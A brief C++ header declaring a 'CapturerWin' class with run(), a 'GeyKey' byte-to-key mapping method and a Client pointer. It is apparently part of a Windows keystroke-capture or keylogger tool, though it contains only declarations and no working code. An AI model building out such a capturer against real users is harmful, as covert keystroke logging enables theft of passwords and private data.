#pragma once

class CapturerWin
{
public:
    CapturerWin(Client* client);

    void run();

    bool GeyKey(unsigned char c, std::string &key);
    std::string intToString(unsigned short i);

private:
    Client* _client;
    std::string _user;
};
